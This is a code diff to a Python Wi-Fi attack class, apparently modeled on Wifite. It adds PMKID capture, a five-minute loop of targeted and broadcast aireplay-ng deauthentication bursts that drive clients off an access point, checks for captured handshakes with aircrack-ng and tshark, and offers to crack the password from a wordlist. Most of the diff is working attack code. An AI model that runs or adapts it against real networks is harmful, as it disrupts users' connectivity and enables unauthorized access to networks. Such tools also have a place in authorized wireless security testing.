@@ -421,7 +421,7 @@ class HandshakeCapture:
         return findings
 
     def start_capture(self):
-        """Start handshake capture using Wifite-inspired approach"""
+        """Start handshake capture using Wifite's approach"""
         if not self.check_dependencies():
             return
 
@@ -468,21 +468,24 @@ class HandshakeCapture:
 
         try:
             self.running = True
-            cycle_count = 1
-            max_cycles = 10
             
             # Create unique capture file
             timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
             self.capture_file = get_capture_path(f'handshake_{self.target_bssid.replace(":", "")}_{timestamp}')
 
-            # Start airodump-ng for capture
+            # First try PMKID capture (Wifite does this first)
+            self.console.print("\n[yellow]Attempting PMKID capture first...[/yellow]")
+            if self.capture_pmkid():
+                self.console.print("[green]✓ PMKID captured! No need for handshake capture.[/green]")
+                return
+
+            # Start airodump-ng for handshake capture
             capture_cmd = [
                 'airodump-ng',
                 '--bssid', self.target_bssid,
                 '--channel', self.target_channel,
                 '--write', self.capture_file,
                 '--output-format', 'pcap,csv',
-                '--write-interval', '1',  # Write every second
                 self.interface
             ]
             
@@ -492,94 +495,84 @@ class HandshakeCapture:
                 stderr=subprocess.DEVNULL
             )
 
-            # Let capture initialize
+            # Let airodump-ng initialize
             time.sleep(2)
 
-            # Main capture loop
-            while self.running and not self.handshake_captured and cycle_count <= max_cycles:
-                self.console.print(f"\n[cyan]Handshake Capture Cycle {cycle_count}/{max_cycles}[/cyan]")
+            # Wifite's attack parameters
+            start_time = time.time()
+            attack_timeout = 300  # 5 minutes total
+            deauth_interval = 5    # Send deauth every 5 seconds
+            client_check_interval = 3  # Check clients every 3 seconds
+            last_deauth = 0
+            last_client_check = 0
+            deauth_count = 0  # Track number of deauth attempts
+            max_deauth_attempts = 5  # Maximum deauth bursts before switching strategy
+            
+            self.console.print("\n[yellow]Starting handshake capture...[/yellow]")
+            self.console.print("[cyan]Press Ctrl+C to stop[/cyan]")
 
-                # Phase 1: Initial client detection (10 seconds)
-                self.console.print("\n[yellow]Phase 1: Detecting active clients...[/yellow]")
-                time.sleep(10)
+            while self.running and (time.time() - start_time) < attack_timeout:
+                current_time = time.time()
                 
-                # Get current clients
-                clients = self.get_connected_clients()
-                
-                if clients:
-                    self.console.print(f"[green]Found {len(clients)} connected clients[/green]")
-                    
-                    # Phase 2: Targeted deauth with aireplay-ng
-                    self.console.print("\n[yellow]Phase 2: Targeted client deauthentication[/yellow]")
-                    
-                    for client in clients:
-                        if not self.running:
-                            break
-                            
-                        self.console.print(f"[cyan]Targeting client: {client}[/cyan]")
-                        
-                        # Send deauth to client and AP using aireplay-ng
-                        deauth_cmd = [
+                # Check for handshake first
+                if os.path.exists(f"{self.capture_file}-01.cap"):
+                    if self.verify_handshake_wifite(f"{self.capture_file}-01.cap"):
+                        self.handshake_captured = True
+                        break
+
+                # Check for clients periodically
+                if current_time - last_client_check >= client_check_interval:
+                    clients = self.get_connected_clients()
+                    last_client_check = current_time
+
+                # Send deauth packets periodically
+                if current_time - last_deauth >= deauth_interval:
+                    deauth_count += 1
+                    if clients:
+                        self.console.print(f"\n[cyan]Deauth burst #{deauth_count} targeting {len(clients)} clients...[/cyan]")
+                        for client in clients:
+                            if not self.running:
+                                break
+                                
+                            # Send deauth to client and AP (both directions)
+                            deauth_to_client = [
+                                'aireplay-ng',
+                                '--deauth', '2',  # 2 packets
+                                '-a', self.target_bssid,  # AP
+                                '-c', client,  # Client
+                                '--ignore-negative-one',
+                                self.interface
+                            ]
+                            subprocess.run(deauth_to_client, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                            time.sleep(0.1)  # Small delay between packets
+                    else:
+                        self.console.print(f"\n[yellow]Deauth burst #{deauth_count} (broadcast)...[/yellow]")
+                        # Wifite's broadcast deauth approach
+                        deauth_broadcast = [
                             'aireplay-ng',
-                            '--deauth', '2',  # Send 2 deauth packets
-                            '-a', self.target_bssid,  # Target AP
-                            '-c', client,  # Target client
+                            '--deauth', '5',  # More packets for broadcast
+                            '-a', self.target_bssid,
                             '--ignore-negative-one',
                             self.interface
                         ]
-                        
-                        # Send deauth bursts with delays
-                        for _ in range(2):  # 2 bursts
-                            subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                            time.sleep(0.5)  # Short delay between bursts
-                            
-                            # Check for handshake
-                            if self.check_for_handshake():
-                                self.handshake_captured = True
-                                break
-                        
-                        if self.handshake_captured:
-                            break
-                            
-                        # Wait briefly for reconnection
-                        time.sleep(2)
-                else:
-                    # Phase 2 Alternative: Broadcast deauth
-                    self.console.print("\n[yellow]Phase 2: Broadcast deauthentication[/yellow]")
+                        subprocess.run(deauth_broadcast, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                     
-                    # Use aireplay-ng for broadcast deauth
-                    broadcast_cmd = [
-                        'aireplay-ng',
-                        '--deauth', '2',  # Send 2 deauth packets
-                        '-a', self.target_bssid,  # Target AP
-                        '--ignore-negative-one',
-                        self.interface
-                    ]
-                    
-                    # Send multiple bursts
-                    for _ in range(2):  # 2 bursts
-                        subprocess.run(broadcast_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-                        time.sleep(1)  # Longer delay for broadcast
-                        
-                        if self.check_for_handshake():
+                    # After each deauth burst, wait and check for handshake
+                    time.sleep(1)
+                    if os.path.exists(f"{self.capture_file}-01.cap"):
+                        if self.verify_handshake_wifite(f"{self.capture_file}-01.cap"):
                             self.handshake_captured = True
                             break
+                    
+                    last_deauth = current_time
+                    
+                    # If we've tried enough times with one strategy, switch to the other
+                    if deauth_count >= max_deauth_attempts:
+                        clients = []  # Force broadcast deauth
+                        deauth_count = 0  # Reset counter
+                        self.console.print("[yellow]Switching deauth strategy...[/yellow]")
                 
-                # Phase 3: Listen for handshake (5 seconds)
-                if not self.handshake_captured:
-                    self.console.print("\n[yellow]Phase 3: Listening for handshake...[/yellow]")
-                    for _ in range(5):
-                        time.sleep(1)
-                        if self.check_for_handshake():
-                            self.handshake_captured = True
-                            break
-
-                if self.handshake_captured:
-                    break
-
-                cycle_count += 1
-                if cycle_count <= max_cycles:
-                    self.console.print("\n[yellow]Starting next cycle...[/yellow]")
+                time.sleep(0.1)  # Prevent CPU overload
 
             # Process results
             if capture_process:
@@ -596,29 +589,15 @@ class HandshakeCapture:
                     shutil.copy(f"{self.capture_file}-01.cap", save_path)
                     self.console.print(f"[green]Handshake saved to: {save_path}[/green]")
                     
-                    # Verify handshake quality
-                    self.console.print("\n[yellow]Verifying handshake quality...[/yellow]")
-                    if self.verify_handshake_quality(save_path):
-                        self.console.print("[green]✓ Handshake verification passed![/green]")
-                        
-                        # Offer to crack
-                        self.console.print("\n[cyan]Would you like to attempt to crack the password? (y/n)[/cyan]")
-                        if input().lower() == 'y':
-                            if self.crack_cap_file():
-                                self.console.print("[green]Password cracking successful![/green]")
-                            else:
-                                self.console.print("[yellow]Password not found in wordlist.[/yellow]")
-                                self.gather_network_info()
+                    # Offer to crack
+                    self.console.print("\n[cyan]Would you like to attempt to crack the password? (y/n)[/cyan]")
+                    if input().lower() == 'y':
+                        if self.crack_cap_file():
+                            self.console.print("[green]Password cracking successful![/green]")
                         else:
-                            self.gather_network_info()
-                    else:
-                        self.console.print("[red]× Handshake verification failed - poor quality capture[/red]")
-                        self.console.print("[yellow]Continuing capture process...[/yellow]")
-                        self.handshake_captured = False
-                        cycle_count -= 1  # Don't count this cycle
+                            self.console.print("[yellow]Password not found in wordlist.[/yellow]")
             else:
-                self.console.print("\n[yellow]No handshake captured after maximum cycles.[/yellow]")
-                self.gather_network_info()
+                self.console.print("\n[yellow]No handshake captured within timeout period.[/yellow]")
 
         except KeyboardInterrupt:
             self.console.print("\n[yellow]Capture stopped by user[/yellow]")
@@ -631,6 +610,32 @@ class HandshakeCapture:
                 cleanup_temp_files()
             except:
                 pass
+
+    def verify_handshake_wifite(self, capfile):
+        """Wifite's exact method to verify handshake capture"""
+        try:
+            # First check - aircrack-ng
+            cmd = ['aircrack-ng', capfile]
+            process = subprocess.run(cmd, capture_output=True, text=True)
+            if "1 handshake" not in process.stdout:
+                return False
+
+            # Second check - tshark EAPOL count (Wifite's method)
+            cmd = ['tshark', '-r', capfile, '-Y', 'eapol.type == 3', '-c', '1']
+            process = subprocess.run(cmd, capture_output=True, text=True)
+            if not process.stdout.strip():
+                return False
+
+            return True
+        except:
+            return False
+
+    def has_handshake(self, capfile):
+        """Wifite's method to verify handshake capture"""
+        # Quick check with aircrack-ng
+        cmd = ['aircrack-ng', capfile]
+        process = subprocess.run(cmd, capture_output=True, text=True)
+        return "1 handshake" in process.stdout
 
     def verify_handshake_quality(self, capfile):
         """Verify the quality of the captured handshake using multiple tools"""
